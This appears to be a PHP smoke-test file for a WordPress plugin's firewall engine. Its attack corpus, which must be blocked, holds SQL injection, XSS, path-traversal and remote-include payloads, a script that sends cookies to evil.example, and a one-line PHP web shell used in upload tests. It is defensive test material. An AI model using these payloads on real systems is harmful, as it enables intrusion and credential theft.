<?php
/**
 * Perdita Core smoke tests: the firewall engine, its config compiler, its
 * loaders, the trust cookie, and the settings section.
 *
 * Loaded by tests/smoke.php's fragment loop. Every option and file it touches
 * is restored: the compiler, the loaders, and the log write into a temp
 * folder through the perdita_firewall_* path filters, and the options go back
 * to their stored values (or away when they didn't exist).
 *
 * @package Perdita_Core
 */

defined( 'ABSPATH' ) || exit;

echo "\n--- firewall (tests/smoke-security-firewall.php) ---\n";

require_once PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall.php';
require_once PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall-config.php';
require_once PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall-loader.php';
require_once PERDITA_CORE_DIR . 'inc/modules/security/class-perdita-security-firewall-admin.php';

$pfw_opt_names = array( 'perdita_security_settings', Perdita_Firewall_Config::KEY_OPTION, Perdita_Firewall_Config::STATE_OPTION );
$pfw_orig      = array();
foreach ( $pfw_opt_names as $pfw_name ) {
	$pfw_orig[ $pfw_name ] = get_option( $pfw_name, '__pfw_absent__' );
}

// Deactivate and uninstall call the security module's teardown, which edits
// the live uploads .htaccess and clears its cron event. Both go back at the end.
$pfw_uploads       = wp_get_upload_dir();
$pfw_uploads_ht    = trailingslashit( $pfw_uploads['basedir'] ) . '.htaccess';
$pfw_uploads_orig  = is_file( $pfw_uploads_ht ) ? (string) file_get_contents( $pfw_uploads_ht ) : null;
$pfw_cron_hook     = class_exists( 'Perdita_Security' ) && defined( 'Perdita_Security::CORE_CHECK_CRON' ) ? Perdita_Security::CORE_CHECK_CRON : 'perdita_security_core_check_run';
$pfw_cron_next     = wp_next_scheduled( $pfw_cron_hook );
$pfw_live_config   = is_file( WP_CONTENT_DIR . '/perdita-firewall/config.php' );
$pfw_live_mu       = is_file( WP_CONTENT_DIR . '/mu-plugins/0-perdita-firewall.php' );

$pfw_tmp = trailingslashit( get_temp_dir() ) . 'pfw-smoke-' . wp_generate_password( 8, false ) . '/';
wp_mkdir_p( $pfw_tmp . 'root' );
wp_mkdir_p( $pfw_tmp . 'mu' );
$pfw_filters = array(
	'perdita_firewall_dir'            => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'perdita-firewall/';
	},
	'perdita_firewall_bootstrap_path' => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'perdita-firewall-bootstrap.php';
	},
	'perdita_firewall_mu_dir'         => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'mu';
	},
	'perdita_firewall_user_ini_path'  => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'root/.user.ini';
	},
	'perdita_firewall_htaccess_path'  => function () use ( $pfw_tmp ) {
		return $pfw_tmp . 'root/.htaccess';
	},
);
foreach ( $pfw_filters as $pfw_hook => $pfw_cb ) {
	add_filter( $pfw_hook, $pfw_cb );
}

/* ---------- wiring ---------- */

$ok( false !== has_action( 'update_option_perdita_security_settings', array( 'Perdita_Firewall_Config', 'on_update' ) ), 'firewall: perdita-core.php hooks the compiler on update_option_perdita_security_settings' );
$ok( false !== has_action( 'add_option_perdita_security_settings', array( 'Perdita_Firewall_Config', 'on_add' ) ), 'firewall: perdita-core.php hooks the compiler on add_option_perdita_security_settings' );
$ok( false !== has_action( 'update_option_perdita_core', array( 'Perdita_Firewall_Config', 'on_module_state' ) ), 'firewall: a module toggle recompiles the config' );
$ok( false !== has_action( 'deactivate_' . plugin_basename( PERDITA_CORE_FILE ), array( 'Perdita_Firewall_Config', 'on_deactivate' ) ), 'firewall: Core deactivation removes the firewall loaders' );
$ok( false !== strpos( (string) file_get_contents( PERDITA_CORE_DIR . 'uninstall.php' ), 'Perdita_Firewall_Config::uninstall()' ), 'firewall: uninstall.php removes the firewall files and options' );
foreach ( glob( PERDITA_CORE_DIR . 'inc/modules/security/firewall/*.php' ) as $pfw_file ) {
	$pfw_src = (string) file_get_contents( $pfw_file );
	$ok( ! preg_match( '/<<<\s*[\'"]?[A-Za-z_]/', $pfw_src ), 'firewall: no heredoc or nowdoc in ' . basename( $pfw_file ) );
}
$pfw_engine_src = (string) file_get_contents( PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall.php' );
// settle() runs inside WordPress and defer() may, so those two calls sit
// behind function_exists() guards.
$ok( false !== strpos( $pfw_engine_src, "if ( function_exists( 'add_action' ) ) {\n\t\t\tadd_action( \$tag, \$callback" ) && false !== strpos( $pfw_engine_src, "function_exists( 'current_user_can' ) && current_user_can( \$cap )" ), 'firewall: the engine guards its two WordPress calls with function_exists()' );
$pfw_engine_bare = str_replace( array( "add_action( \$tag, \$callback", 'current_user_can( $cap )' ), '', $pfw_engine_src );
$ok( ! preg_match( '/\b(?:get_option|apply_filters|add_action|current_user_can|esc_html|wp_[a-z_]+)\s*\(/', $pfw_engine_bare ), 'firewall: the engine calls no other WordPress function, so it runs before WordPress loads' );

/* ---------- engine config for the corpus ---------- */

$pfw_settings = array_merge(
	Perdita_Firewall_Config::defaults(),
	array(
		'firewall'       => true,
		'firewall_mode'  => 'block',
		'disable_xmlrpc' => true,
		'ip_allowlist'   => array( '198.51.100.0/24', '2001:db8:aa::/48', '192.0.2.7' ),
	)
);
$pfw_cfg = Perdita_Firewall_Config::build( $pfw_settings, true );
$ok( ! empty( $pfw_cfg['enabled'] ) && 'block' === $pfw_cfg['mode'], 'firewall: build() turns the firewall on in block mode from the settings' );
$ok( false === Perdita_Firewall_Config::build( $pfw_settings, false )['enabled'], 'firewall: build() keeps the firewall off while the security module is off' );
$ok( 8 === count( array_filter( $pfw_cfg['rules'] ) ), 'firewall: every rule category is on once the firewall is on' );
$ok( preg_match( '/^[0-9a-f]{64}$/', $pfw_cfg['key'] ) && $pfw_cfg['key'] === get_option( Perdita_Firewall_Config::KEY_OPTION ), 'firewall: the trust key is 64 hex characters, stored in an option' );
$ok( ABSPATH === $pfw_cfg['abspath'] && 'edit_posts' === $pfw_cfg['trust_cap'], 'firewall: the config carries ABSPATH and the trust capability for deferred verdicts' );
$ok( ! empty( $pfw_cfg['cf_ranges']['v4'] ) && ! empty( $pfw_cfg['cf_ranges']['v6'] ), 'firewall: the Cloudflare ranges compile into the config' );

$pfw_ua     = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36';
$pfw_server = function ( $uri = '/', $extra = array() ) use ( $pfw_ua ) {
	return array_merge(
		array(
			'REQUEST_URI'     => $uri,
			'REQUEST_METHOD'  => 'GET',
			'REMOTE_ADDR'     => '203.0.113.50',
			'SERVER_ADDR'     => '10.0.0.5',
			'HTTP_USER_AGENT' => $pfw_ua,
		),
		$extra
	);
};
$pfw_token = 'Tk' . str_repeat( 'a1B2', 10 ) . 'z';
$pfw_li    = array( 'wordpress_logged_in_' . md5( 'smoke' ) => 'admin|' . ( time() + DAY_IN_SECONDS ) . '|' . $pfw_token . '|' . str_repeat( 'c', 64 ) );
$pfw_trust = array( Perdita_Firewall::TRUST_COOKIE => Perdita_Firewall::trust_value( 1, time() + 3600, $pfw_cfg['key'], $pfw_token ) ) + $pfw_li;
$pfw_unhook = function () {
	remove_action( 'init', array( 'Perdita_Firewall', 'settle' ), Perdita_Firewall::SETTLE_PRIORITY );
	remove_action( 'init', array( 'Perdita_Firewall', 'settle_if_trusted' ), Perdita_Firewall::SETTLE_PRIORITY );
	remove_action( 'wp', array( 'Perdita_Firewall', 'settle' ), Perdita_Firewall::SETTLE_PRIORITY );
	remove_action( 'xmlrpc_call', array( 'Perdita_Firewall', 'settle' ), Perdita_Firewall::SETTLE_PRIORITY );
	remove_filter( 'rest_authentication_errors', array( 'Perdita_Firewall', 'settle_rest' ), Perdita_Firewall::REST_SETTLE_PRIORITY );
};
$pfw_run   = function ( $req ) use ( $pfw_cfg, $pfw_server ) {
	$req = array_merge(
		array(
			'uri'    => '/',
			'server' => array(),
			'get'    => array(),
			'post'   => array(),
			'cookie' => array(),
			'files'  => array(),
			'body'   => null,
			'config' => $pfw_cfg,
		),
		$req
	);
	return Perdita_Firewall::run( $req['config'], $pfw_server( $req['uri'], $req['server'] ), $req['get'], $req['post'], $req['cookie'], $req['files'], $req['body'] );
};

/* ---------- false-positive corpus: must pass in block mode ---------- */

$pfw_gutenberg = wp_json_encode(
	array(
		'id'      => 42,
		'title'   => 'Spring menu: Select Union Jack scones',
		'content' => "<!-- wp:paragraph {\"align\":\"center\"} -->\n<p class=\"has-text-align-center\">Hi <strong>there</strong>, it's O'Brien's <a href=\"https://example.org/a?b=1&amp;c=2\">menu</a>.</p>\n<!-- /wp:paragraph -->\n<!-- wp:html -->\n<blockquote class=\"twitter-tweet\"><a href=\"https://twitter.com/x/status/1\">tweet</a></blockquote><script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n<!-- /wp:html -->\n<!-- wp:code --><pre class=\"wp-block-code\"><code>SELECT id FROM wp_posts WHERE post_status = 'publish' -- newest first</code></pre><!-- /wp:code -->",
		'status'  => 'publish',
		'meta'    => array( 'footnotes' => '' ),
	)
);
$pfw_gutenberg_plain = wp_json_encode(
	array(
		'id'      => 43,
		'content' => "<!-- wp:paragraph -->\n<p>How to select a union rep, and why 1 Union Select Rd is our address.</p>\n<!-- /wp:paragraph -->\n<!-- wp:image {\"id\":7,\"sizeSlug\":\"large\",\"linkDestination\":\"none\"} -->\n<figure class=\"wp-block-image size-large\"><img src=\"https://example.org/wp-content/uploads/a.jpg\" alt=\"\" class=\"wp-image-7\"/></figure>\n<!-- /wp:image -->",
	)
);
$pfw_post_data = http_build_query(
	array(
		'billing_first_name' => "D'Arcy",
		'billing_last_name'  => "O'Brien",
		'billing_address_1'  => '1 Union Select Rd',
		'billing_address_2'  => 'Apt 4, Select Union Building',
		'billing_city'       => 'Springfield',
		'billing_email'      => 'darcy+shop@example.com',
		'order_comments'     => "Leave it by the door -- thanks! Don't ring.",
	)
);
$pfw_benign = array(
	'classic post save with HTML and a script embed (trusted)' => array(
		'uri'    => '/wp-admin/post.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => $pfw_trust,
		'post'   => array(
			'action'       => 'editpost',
			'post_ID'      => '42',
			'post_title'   => 'Drop Table: our new desk',
			'content'      => '<p>See <a href="https://example.org">this</a>.</p><script src="https://platform.twitter.com/widgets.js"></script><iframe src="https://www.youtube.com/embed/x"></iframe> <img src="a.jpg" onerror="this.remove()">',
			'_wpnonce'     => 'abc123',
			'post_status'  => 'publish',
			'tax_input'    => array( 'post_tag' => 'sql, union, select' ),
		),
	),
	'Gutenberg REST save with a script embed (trusted)' => array(
		'uri'    => '/wp-json/wp/v2/posts/42?_locale=user',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'cookie' => $pfw_trust,
		'body'   => $pfw_gutenberg,
	),
	'Gutenberg REST save of plain blocks (untrusted)' => array(
		'uri'    => '/wp-json/wp/v2/posts/43?_locale=user',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'body'   => $pfw_gutenberg_plain,
	),
	'WooCommerce checkout with 1 Union Select Rd and a Drop Table product (untrusted)' => array(
		'uri'    => '/?wc-ajax=checkout',
		'get'    => array( 'wc-ajax' => 'checkout' ),
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => array(
			'woocommerce_cart_hash'        => 'f1e2d3c4b5a6',
			'wp_woocommerce_session_abc'   => '7||1731900000||1731896400||a1b2c3d4e5f6',
			'woocommerce_items_in_cart'    => '1',
		),
		'post'   => array(
			'billing_first_name'                  => "D'Arcy",
			'billing_last_name'                   => "O'Brien",
			'billing_company'                     => 'Union Select & Sons',
			'billing_country'                     => 'US',
			'billing_address_1'                   => '1 Union Select Rd',
			'billing_address_2'                   => 'Apt 4, Select Union Building',
			'billing_city'                        => 'Springfield',
			'billing_state'                       => 'IL',
			'billing_postcode'                    => '62701',
			'billing_phone'                       => '(217) 555-0100',
			'billing_email'                       => 'darcy+shop@example.com',
			'order_comments'                      => "Leave it by the door -- thanks! Don't ring. I'll be at 1 Union Square.",
			'shipping_method'                     => array( 'flat_rate:1' ),
			'payment_method'                      => 'stripe',
			'cart'                                => array( 'a1b2c3' => array( 'qty' => '2', 'name' => 'Drop Table' ) ),
			'woocommerce-process-checkout-nonce'  => '9f8e7d6c5b',
			'_wp_http_referer'                    => '/?wc-ajax=update_order_review',
		),
	),
	'WooCommerce update_order_review with serialized post_data (untrusted)' => array(
		'uri'    => '/?wc-ajax=update_order_review',
		'get'    => array( 'wc-ajax' => 'update_order_review' ),
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'security'  => '1a2b3c4d5e',
			'payment_method' => 'stripe',
			'country'   => 'US',
			'address'   => '1 Union Select Rd',
			'post_data' => $pfw_post_data,
		),
	),
	'comment with <b> and a URL (untrusted)' => array(
		'uri'    => '/wp-comments-post.php',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'HTTP_REFERER' => 'https://example.org/hello-world/' ),
		'post'   => array(
			'comment'         => "Great post! <b>Bold</b> and <a href=\"https://example.org/a?b=1&c=2\">a link</a>. I'd select the union option -- it's the best. 5 > 3 and x=y.",
			'author'          => "Seán O'Connor",
			'email'           => 'sean@example.org',
			'url'             => 'https://example.org/?p=5&utm_source=x',
			'comment_post_ID' => '5',
			'comment_parent'  => '0',
		),
	),
	'search for "how to select a union rep" (untrusted)' => array(
		'uri' => '/?s=how+to+select+a+union+rep',
		'get' => array( 's' => 'how to select a union rep' ),
	),
	'search for a product named Drop Table (untrusted)' => array(
		'uri' => '/?s=drop+table&post_type=product',
		'get' => array( 's' => 'drop table', 'post_type' => 'product' ),
	),
	'Customizer save with CSS and an HTML widget (trusted)' => array(
		'uri'    => '/wp-admin/admin-ajax.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => $pfw_trust,
		'post'   => array(
			'wp_customize'             => 'on',
			'action'                   => 'customize_save',
			'customize_theme'          => 'perdita',
			'customize_changeset_uuid' => '4d3c2b1a-0000-4000-8000-123456789abc',
			'nonce'                    => 'a1b2c3d4e5',
			'customized'               => wp_json_encode(
				array(
					'custom_css[perdita]'  => 'body{background:url("data:image/svg+xml;base64,PHN2Zz4=")} .x::before{content:"\'--"}',
					'widget_custom_html[2]' => array( 'content' => '<script>window.dataLayer=window.dataLayer||[];</script><div onclick="go()">Go</div>' ),
					'blogname'             => "Bob's Union Select Café",
				)
			),
		),
	),
	'admin-ajax heartbeat (untrusted)' => array(
		'uri'    => '/wp-admin/admin-ajax.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'action'    => 'heartbeat',
			'_nonce'    => '0a1b2c3d4e',
			'screen_id' => 'post',
			'has_focus' => 'false',
			'interval'  => '60',
			'data'      => array(
				'wp-refresh-post-lock' => array( 'post_id' => '42', 'lock' => '1731900000:1' ),
				'wp-refresh-post-nonces' => array( 'post_id' => '42' ),
			),
		),
	),
	'login with a password full of quotes and -- (untrusted)' => array(
		'uri'    => '/wp-login.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'log'         => 'admin',
			'pwd'         => "p@ss' OR '1'='1'-- <script>",
			'rememberme'  => 'forever',
			'wp-submit'   => 'Log In',
			'redirect_to' => 'https://example.org/wp-admin/',
			'testcookie'  => '1',
		),
	),
	'password reset with quotes in both fields (untrusted)' => array(
		'uri'    => '/wp-login.php?action=resetpass',
		'get'    => array( 'action' => 'resetpass' ),
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array(
			'pass1'     => "a'b\"c-- #1=1",
			'pass2'     => "a'b\"c-- #1=1",
			'rp_key'    => 'AbCdEf123',
			'wp-submit' => 'Save Password',
		),
	),
	'REST comment from a visitor (untrusted)' => array(
		'uri'    => '/wp-json/wp/v2/comments',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json; charset=utf-8' ),
		'body'   => wp_json_encode( array( 'post' => 5, 'author_name' => "Zoë O'Neil", 'content' => 'Loved it. Will <em>select</em> the union tour -- 10/10.' ) ),
	),
	'WooCommerce Store API add to cart (untrusted)' => array(
		'uri'    => '/wp-json/wc/store/v1/cart/add-item',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'body'   => wp_json_encode( array( 'id' => 12, 'quantity' => 1, 'variation' => array( array( 'attribute' => 'Size', 'value' => "Kids' L" ) ) ) ),
	),
	'image upload from a visitor (untrusted)' => array(
		'uri'    => '/contact/',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'files'  => array(
			'photo' => array( 'name' => 'holiday photo.jpg', 'type' => 'image/jpeg', 'tmp_name' => '', 'error' => 0, 'size' => 1000 ),
		),
	),
	'pretty permalink with select and union in the slug (untrusted)' => array(
		'uri' => '/2026/11/how-to-select-a-union-rep/',
	),
	'plain GET with tracking args (untrusted)' => array(
		'uri' => '/shop/?utm_source=news&utm_medium=email&fbclid=IwAR0abc',
		'get' => array( 'utm_source' => 'news', 'utm_medium' => 'email', 'fbclid' => 'IwAR0abc' ),
	),
	'oEmbed proxy for a YouTube URL (untrusted)' => array(
		'uri' => '/wp-json/oembed/1.0/proxy?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dabc',
		'get' => array( 'url' => 'https://www.youtube.com/watch?v=abc' ),
	),
	'redirect_to on a login link (untrusted)' => array(
		'uri' => '/wp-login.php?redirect_to=https%3A%2F%2Fexample.org%2Fwp-admin%2F&reauth=1',
		'get' => array( 'redirect_to' => 'https://example.org/wp-admin/', 'reauth' => '1' ),
	),
	'wp-cron loopback from 127.0.0.1' => array(
		'uri'    => '/wp-cron.php?doing_wp_cron=1731900000.1234567890',
		'server' => array( 'REMOTE_ADDR' => '127.0.0.1', 'HTTP_USER_AGENT' => 'WordPress/7.1.5; https://example.org' ),
		'get'    => array( 'doing_wp_cron' => '1731900000.1234567890' ),
	),
	'site health loopback with a WordPress user agent' => array(
		'uri'    => '/wp-admin/site-health.php?health-check-test-wp_version_check=1',
		'server' => array( 'REMOTE_ADDR' => '10.0.0.5', 'HTTP_USER_AGENT' => 'WordPress/7.1.5; https://example.org' ),
		'get'    => array( 'health-check-test-wp_version_check' => '1' ),
	),
	'.well-known request (untrusted)' => array(
		'uri' => '/.well-known/acme-challenge/abc123',
	),
);
foreach ( $pfw_benign as $pfw_label => $pfw_req ) {
	$pfw_v = $pfw_run( $pfw_req );
	$ok( 'allow' === $pfw_v['action'], 'firewall false positives: ' . $pfw_label . ' passes in block mode' . ( 'allow' === $pfw_v['action'] ? '' : ' (got ' . $pfw_v['rule'] . ' on ' . $pfw_v['field'] . ': ' . $pfw_v['match'] . ')' ) );
}
$ok( 'cron_loopback' === $pfw_run( $pfw_benign['wp-cron loopback from 127.0.0.1'] )['reason'], 'firewall: the wp-cron loopback skips inspection' );
$ok( true === $pfw_run( $pfw_benign['Gutenberg REST save with a script embed (trusted)'] )['trusted'], 'firewall: a valid trust cookie marks the request trusted' );

/* ---------- attack corpus: must block ---------- */

$pfw_attacks = array(
	// sqlmap and classic SQL injection.
	"1' OR '1'='1",
	"' or 1=1--",
	'1 AND 1=1',
	"1' AND 1234=1234 AND 'abcd'='abcd",
	'-1 UNION SELECT 1,2,3--',
	"1' UNION ALL SELECT NULL,NULL,CONCAT(0x7162787671,0x4b4c4d,0x716a6b7a71)-- -",
	'1/**/UNION/**/SELECT/**/user_login,user_pass/**/FROM/**/wp_users',
	'1 /*!50000UNION*/ /*!50000SELECT*/ 1,2',
	'1 AND SLEEP(5)',
	"1' AND (SELECT 1234 FROM (SELECT(SLEEP(5)))abcd)-- x",
	"1;WAITFOR DELAY '0:0:5'--",
	'1 AND BENCHMARK(5000000,MD5(1))',
	'1 AND extractvalue(1,concat(0x7e,version()))',
	'1 and updatexml(1,concat(0x7e,(select user())),1)',
	"admin'--",
	"admin' #",
	"1'; DROP TABLE wp_users;--",
	'%2527%20OR%25201%3D1--',
	"1' ORDER BY 10--",
	'1 UNION SELECT table_name FROM information_schema.tables',
	'1 AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64',
	'1 UNION SELECT @@version',
	"1' AND 1=1 UNION SELECT LOAD_FILE('/etc/passwd')-- -",
	"1 INTO OUTFILE '/var/www/shell.php'",
	// XSS cheat sheet.
	'<script>alert(1)</script>',
	'"><script>alert(String.fromCharCode(88,83,83))</script>',
	'<img src=x onerror=alert(1)>',
	'<svg/onload=alert(document.domain)>',
	'<body onload=alert(1)>',
	'<a href="javascript:alert(1)">x</a>',
	'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
	'<a href="jav&#x09;ascript:alert(1)">x</a>',
	'%3Cscript%3Ealert(1)%3C%2Fscript%3E',
	'%253Cscript%253Ealert(1)%253C%252Fscript%253E',
	'<iframe src="//evil.example"></iframe>',
	'<div style="width:expression(alert(1))">',
	"';alert(1)//",
	'<details open ontoggle=alert(1)>',
	'<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
	// Traversal, LFI, wrappers.
	'../../wp-config.php',
	'....//....//etc/passwd',
	'..%2F..%2F..%2Fetc%2Fpasswd',
	'php://filter/convert.base64-encode/resource=wp-config.php',
	"image.jpg\0.php",
	'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==',
	'..\\..\\..\\windows\\win.ini',
	'expect://id',
	'phar://uploads/evil.jpg',
	// Remote includes.
	'http://evil.example/shell.txt?',
	'-d allow_url_include=1 -d auto_prepend_file=php://input',
);
foreach ( $pfw_attacks as $pfw_payload ) {
	$pfw_v = $pfw_run(
		array(
			'uri' => '/?id=1',
			'get' => array( 'id' => $pfw_payload ),
		)
	);
	$ok( 'block' === $pfw_v['action'], 'firewall attacks: query payload blocks: ' . substr( str_replace( "\0", '\\0', $pfw_payload ), 0, 70 ) . ( 'block' === $pfw_v['action'] ? ' (' . $pfw_v['rule'] . ')' : '' ) );
}
$pfw_v = $pfw_run(
	array(
		'uri' => '/?file=x',
		'get' => array( 'file' => 'https://evil.example/shell' ),
	)
);
$ok( 'rfi-002' === $pfw_v['rule'], 'firewall attacks: a remote URL in an include-style parameter blocks as rfi-002' );
$pfw_v = $pfw_run(
	array(
		'uri' => '/?file=x',
		'get' => array( 'file' => 'https://' . $pfw_cfg['host'] . '/a.pdf' ),
	)
);
$ok( 'allow' === $pfw_v['action'], 'firewall: a URL to this site in an include-style parameter passes' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/wp-comments-post.php',
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'post'   => array( 'comment' => 'nice <script>document.location="https://evil.example/?c="+document.cookie</script>' ),
	)
);
$ok( 'block' === $pfw_v['action'] && 'post:comment' === $pfw_v['field'] && 'xss' === $pfw_v['category'], 'firewall attacks: a script in a comment blocks, and the verdict names post:comment' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/wp-json/wp/v2/comments',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'body'   => wp_json_encode( array( 'post' => 5, 'content' => '<img src=x onerror=alert(1)>' ) ),
	)
);
$ok( 'block' === $pfw_v['action'] && 'json:content' === $pfw_v['field'], 'firewall attacks: an XSS payload in an untrusted JSON body blocks as json:content' );
$pfw_body_calls = 0;
$pfw_v          = $pfw_run(
	array(
		'uri'    => '/wp-json/wp/v2/posts/42',
		'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ),
		'cookie' => $pfw_trust,
		'body'   => function () use ( &$pfw_body_calls ) {
			++$pfw_body_calls;
			return '{"content":"<script>x</script>"}';
		},
	)
);
$ok( 'allow' === $pfw_v['action'] && 0 === $pfw_body_calls, 'firewall: a trusted request never reads the JSON body' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/',
		'cookie' => array( 'tracking' => "1' AND SLEEP(5)-- x" ),
	)
);
$ok( 'block' === $pfw_v['action'] && 'cookie:tracking' === $pfw_v['field'], 'firewall attacks: SQL injection in a cookie blocks' );
$pfw_v = $pfw_run(
	array(
		'uri'    => '/',
		'cookie' => array( 'note' => '<script>alert(1)</script>' ),
	)
);
$ok( 'allow' === $pfw_v['action'], 'firewall: cookies get the SQL injection rules only' );
$pfw_v = $pfw_run( array( 'server' => array( 'HTTP_USER_AGENT' => "Mozilla/5.0' AND SLEEP(5)-- x" ) ) );
$ok( 'block' === $pfw_v['action'] && 'ua' === $pfw_v['field'], 'firewall attacks: SQL injection in the user agent blocks' );

$pfw_requests = array(
	'sqlmap user agent'     => array( 'server' => array( 'HTTP_USER_AGENT' => 'sqlmap/1.8.11#stable (https://sqlmap.org)' ) ),
	'WPScan user agent'     => array( 'server' => array( 'HTTP_USER_AGENT' => 'WPScan v3.8.27 (https://wpscan.com/wordpress-security-scanner)' ) ),
	'Nikto user agent'      => array( 'server' => array( 'HTTP_USER_AGENT' => 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)' ) ),
	'Nuclei user agent'     => array( 'server' => array( 'HTTP_USER_AGENT' => 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' ) ),
	'.env probe'            => array( 'uri' => '/.env' ),
	'.env.production probe' => array( 'uri' => '/.env.production' ),
	'.git/config probe'     => array( 'uri' => '/.git/config' ),
	'wp-config.php.bak'     => array( 'uri' => '/wp-config.php.bak' ),
	'wp-config.php~'        => array( 'uri' => '/wp-config.php~' ),
	'debug.log'             => array( 'uri' => '/wp-content/debug.log' ),
	'database dump'         => array( 'uri' => '/backup.sql' ),
	'xmlrpc.php while XML-RPC is off' => array( 'uri' => '/xmlrpc.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ) ),
	'traversal in the path' => array( 'uri' => '/wp-content/plugins/x/download.php/..%2F..%2F..%2Fwp-config.php' ),
);
foreach ( $pfw_requests as $pfw_label => $pfw_req ) {
	$pfw_v = $pfw_run( $pfw_req );
	$ok( 'block' === $pfw_v['action'], 'firewall attacks: ' . $pfw_label . ' blocks' . ( 'block' === $pfw_v['action'] ? ' (' . $pfw_v['rule'] . ')' : '' ) );
}
$pfw_v = $pfw_run(
	array(
		'uri'    => '/',
		'cookie' => $pfw_trust,
		'server' => array( 'HTTP_USER_AGENT' => 'sqlmap/1.8.11#stable (https://sqlmap.org)' ),
	)
);
$ok( 'block' === $pfw_v['action'], 'firewall: the trust cookie never skips the scanner and probe rules' );
$pfw_v = $pfw_run( array( 'uri' => '/wp-config-sample.php' ) );
$ok( 'allow' === $pfw_v['action'], 'firewall: wp-config-sample.php is no probe' );

// Uploads.
$pfw_shell = $pfw_tmp . 'upload.tmp';
file_put_contents( $pfw_shell, "GIF89a\n<?php system(\$_GET['c']); ?>" );
$pfw_jpg = $pfw_tmp . 'photo.tmp';
file_put_contents( $pfw_jpg, "\xFF\xD8\xFF\xE0 plain image bytes" );
foreach ( array( 'shell.php', 'shell.php.jpg', 'shell.PhTmL', 'shell.php5', '.htaccess', 'x.phar' ) as $pfw_name ) {
	$pfw_v = $pfw_run(
		array(
			'server' => array( 'REQUEST_METHOD' => 'POST' ),
			'files'  => array( 'upload' => array( 'name' => $pfw_name, 'tmp_name' => $pfw_jpg, 'error' => 0, 'size' => 10 ) ),
		)
	);
	$ok( 'upload-001' === $pfw_v['rule'], 'firewall attacks: an untrusted upload named ' . $pfw_name . ' blocks' );
}
$pfw_v = $pfw_run(
	array(
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'files'  => array( 'upload' => array( 'name' => array( 'a.jpg', 'b.gif' ), 'tmp_name' => array( $pfw_jpg, $pfw_shell ), 'error' => array( 0, 0 ), 'size' => array( 10, 10 ) ) ),
	)
);
$ok( 'upload-002' === $pfw_v['rule'] && 'file:upload' === $pfw_v['field'], 'firewall attacks: PHP code inside an image upload blocks (multi-file field)' );
$pfw_v = $pfw_run(
	array(
		'server' => array( 'REQUEST_METHOD' => 'POST' ),
		'cookie' => $pfw_trust,
		'files'  => array( 'async-upload' => array( 'name' => 'plugin-file.php', 'tmp_name' => $pfw_shell, 'error' => 0, 'size' => 10 ) ),
	)
);
$ok( 'allow' === $pfw_v['action'], 'firewall: a trusted user can upload a PHP file (the content rules skip trusted requests)' );

/* ---------- modes, allowlist, exclusions ---------- */

$pfw_monitor         = $pfw_cfg;
$pfw_monitor['mode'] = 'monitor';
$pfw_v               = $pfw_run(
	array(
		'config' => $pfw_monitor,
		'get'    => array( 'id' => "1' OR '1'='1" ),
	)
);
$ok( 'monitor' === $pfw_v['action'] && 'sqli-005' === $pfw_v['rule'], 'firewall: monitor mode reports the match and lets the request through' );
$pfw_off            = $pfw_cfg;
$pfw_off['enabled'] = false;
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_off, 'get' => array( 'id' => "1' OR '1'='1" ) ) )['action'], 'firewall: a config with enabled false allows everything' );

foreach ( array( '198.51.100.77', '192.0.2.7', '2001:db8:aa:1::5' ) as $pfw_ip ) {
	$pfw_v = $pfw_run(
		array(
			'server' => array( 'REMOTE_ADDR' => $pfw_ip, 'HTTP_USER_AGENT' => 'sqlmap/1.8' ),
			'get'    => array( 'id' => "1' OR '1'='1" ),
		)
	);
	$ok( 'allow' === $pfw_v['action'] && 'allowlist' === $pfw_v['reason'], 'firewall: allowlisted ' . $pfw_ip . ' skips every rule (CIDR and exact, IPv4 and IPv6)' );
}
